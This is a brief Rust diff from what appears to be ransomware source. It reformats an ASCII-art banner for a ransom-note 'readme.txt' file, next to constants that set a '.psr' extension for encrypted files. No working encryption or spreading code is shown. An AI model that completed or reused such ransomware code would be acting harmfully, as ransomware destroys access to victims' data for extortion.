@@ -51,7 +51,8 @@
  const ENCRYPTED_EXTENSION: &str = ".psr";
  const README_FILENAME: &str = "readme.txt";
  
- const README_BANNER: &str = r#" 888888ba                      dP    888888ba                                                 
+ const README_BANNER: &str = r#"
+  888888ba                      dP    888888ba                                                 
   88    `8b                     88    88    `8b                                                
  a88aaaa8P' dP    dP .d8888b. d8888P a88aaaa8P' .d8888b. 88d888b. .d8888b. .d8888b. 88d8b.d8b. 
   88   `8b. 88    88 Y8ooooo.   88    88   `8b. 88'  `88 88'  `88 Y8ooooo. 88'  `88 88'`88'`88 
